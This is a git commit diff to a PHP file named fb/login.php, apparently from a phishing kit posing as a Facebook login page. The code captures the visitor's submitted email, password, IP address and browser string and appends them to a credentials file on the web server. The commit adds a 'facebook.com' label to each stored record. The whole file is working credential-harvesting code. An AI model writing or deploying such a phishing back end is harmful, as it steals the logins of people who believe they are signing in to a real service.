b87741e1267b78bf580933534e7369bc439e6d8a
Spencer Heywood <l.spencer.heywood@gmail.com>
2018-10-26 15:03:31 -0600

    added facebook label to creds output

--- fb/login.php
+++ fb/login.php
@@ -1,4 +1,5 @@
 <?php
+$webpage = "facebook.com";
 $user = $_POST['email'];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -6,6 +7,7 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 date_default_timezone_set("America/Denver");
 $myfile = fopen("/var/www/html/creds/creds.html", "a") or die("Unable to open file!");
 fwrite($myfile,date("Y-m-d h:i:sa"));
+fwrite($myfile,": ".$webpage);
 fwrite($myfile,": ".$ip);
 fwrite($myfile," --- ".$user);
 fwrite($myfile," --- ".$pass);
